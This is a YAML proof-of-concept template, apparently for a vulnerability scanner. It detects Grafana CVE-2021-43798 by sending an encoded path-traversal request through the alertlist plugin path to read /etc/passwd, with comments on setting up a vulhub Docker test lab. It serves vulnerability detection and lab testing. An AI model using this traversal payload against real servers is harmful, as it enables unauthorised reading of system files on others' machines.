name: poc-yaml-grafana-cve-2021-43798-unauth-fileread-test-1
manual: true
transport: http
rules:
    r0:
        request:
            cache: true
            method: GET
            path: /public/plugins/alertlist/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd
        expression: |
            response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".matches(response.body_string)
expression: |
    r0()
detail:
    author: test
    links:
        - https://github.com/vulhub/vulhub/blob/master/grafana/CVE-2021-43798/README.zh-cn.md
        -


#   https://docs.xray.cool/plugins/practice/poc/Example#%E6%90%AD%E5%BB%BA%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87%E6%B5%8B%E8%AF%95%EF%BC%88built-environment%EF%BC%89
#   git clone https://github.com/vulhub/vulhub.git
#   cd vulhub/grafana/CVE-2021-43798/
#   docker-compose up -d
#   docker ps